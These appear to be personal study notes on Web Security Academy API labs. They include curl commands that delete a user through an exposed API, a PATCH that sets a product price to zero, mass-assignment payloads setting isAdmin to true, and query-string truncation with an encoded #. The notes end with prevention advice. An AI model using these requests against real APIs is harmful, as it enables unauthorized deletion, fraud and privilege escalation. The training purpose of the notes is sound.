/api

/swagger/index.html

/openapi.json



To solve the lab, find the exposed API documentation and delete `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.

https://0a4600be0439212d81b7301000ba002b.web-security-academy.net/

curl -vgw "\n" -X DELETE 'https://0a4600be0439212d81b7301000ba002b.web-security-academy.net/api/user/carlos' -d '{}'



```
curl -vgw "\n" -X GET 'https://0a4600be0439212d81b7301000ba002b.web-security-academy.net/api/user/car'
```

information disclosure

Burp Scanner 

OpenAPI Parser BApp

 Postman 

SoapUI

Burp's browser

JavaScript files. These can contain references to API endpoints that you haven't triggered directly via the web browse

JS Link Finder BApp.

Burp Repeater     Burp Intruder.

## Identifying supported content types



API endpoints often expect data in a specific format. They may therefore behave differently depending on the content type of the data provided in a request. Changing the content type may enable you to:

- Trigger errors that disclose useful information.
- Bypass flawed defenses.
- Take advantage of differences in processing logic. For example, an API may be secure when handling JSON data but susceptible to injection attacks when dealing with XML.

To change the content type, modify the `Content-Type` header, then reformat the request body accordingly. You can use the Content type converter BApp to automatically convert data submitted within requests between XML and JSON.

To solve the lab, exploit a hidden API endpoint to buy a **Lightweight l33t Leather Jacket**. You can log in to your own account using the following credentials: `wiener:peter`.

​    fetch(`//${url.host}/api/products/${encodeURIComponent(productId)}/price`)

```shell
curl -gw "\n" -X GET  https://0af0003704579023807b5864000100c3.web-security-academy.net/api/products/1/price
 
{"price":"$1337.00","message":"&#x1F525; Over 7 sold in the last 4 hours, only 5 remaining! &#x1F525;"}

curl  -gw "\n" -X GET  -H "content-type: text/html" https://0af0003704579023807b5864000
100c3.web-security-academy.net/api/products/1/price
{"price":"$1337.00","message":"&#x1F525; Don't delay, purchase yours today! 2 people have this item in their baskets right now! &#x1F525;"}


curl  -gw "\n" -X PATCH -b "session=i8oeaB7x7rYlWNztOxfztELLGS1Y9UlH" https://0af000370
4579023807b5864000100c3.web-security-academy.net/api/products/4/price
{"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}

curl  -gw "\n" -X PATCH -H "Content-Type: application/json" -b "session=i8oeaB7x7rYlWNztOxfztELLGS1Y9UlH" -d  '{"price": 0}' https://0af0003704579023807b5864000100c3.web-security-academy.net/api/product
s/1/price
{"price":"$0.00"}



```

you can use Intruder to uncover hidden endpoints. 

## Mass assignment vulnerabilities 

 auto-binding)

inadvertently 

## Testing mass assignment vulnerabilities

To test whether you can modify the enumerated `isAdmin` parameter value, add it to the `PATCH` request:

```
{    "username": "wiener",    "email": "wiener@example.com",    "isAdmin": false, } 
```

In addition, send a `PATCH` request with an invalid `isAdmin` parameter value:

```
{    "username": "wiener",    "email": "wiener@example.com",    "isAdmin": "foo", } 
```

If the application behaves differently, this may suggest that the invalid value impacts the query logic, but the valid value doesn't. This may indicate that the parameter can be successfully updated by the user.

You can then send a `PATCH` request with the `isAdmin` parameter value set to `true`, to try and exploit the vulnerability:

```
{    "username": "wiener",    "email": "wiener@example.com",    "isAdmin": true, } 
```

If the `isAdmin` value in the request is bound to the user object without adequate validation and sanitization, the user `wiener` may be incorrectly granted admin privileges. To determine whether this is the case, browse the application as `wiener` to see whether you can access admin functionality.





{  "chosen_discount": {    "percentage": 0  },  "chosen_products": [    {      "product_id": "1",      "name": "Lightweight \"l33t\" Leather Jacket",      "quantity": 1,      "item_price": 133700    }  ] }

{  "chosen_discount": ChosenDiscount,  // defaults to: {"description":null,"discount_id":null,"percentage":0}  "chosen_products": [ChosenProduct] }



```json
{
    "chosen_discount":
    {
        "description":null,
        "discount_id":null,
        "percentage":0
    },
 		"chosen_products":
 			[
                {
                    "product_id":"1",
                    "name":"Lightweight \"l33t\" Leather Jacket",
                    "quantity":1,
                    "item_price":133700
                }
            ]
}
```

## Preventing vulnerabilities in APIs

When designing APIs, make sure that security is a consideration from the beginning. In particular, make sure that you:

- Secure your documentation if you don't intend your API to be publicly accessible.
- Ensure your documentation is kept up to date so that legitimate testers have full visibility of the API's attack surface.
- Apply an allowlist of permitted HTTP methods.
- Validate that the content type is expected for each request or response.
- Use generic error messages to avoid giving away information that may be useful for an attacker.
- Use protective measures on all versions of your API, not just the current production version.

To prevent mass assignment vulnerabilities, allowlist the properties that can be updated by the user, and blocklist sensitive properties that shouldn't be updated by the user.

## Server-side parameter pollution

## Truncating query strings

You can use a URL-encoded `#` character to attempt to truncate the server-side request. To help you interpret the response, you could also add a string after the `#` character.

For example, you could modify the query string to the following:

```
GET /userSearch?name=peter%23foo&back=/home
```

The front-end will try to access the following URL:

```
GET /users/search?name=peter#foo&publicProfile=true
```

#### Note

It's essential that you URL-encode the `#` character. Otherwise the front-end application will interpret it as a fragment identifier and it won't be passed to the internal API.





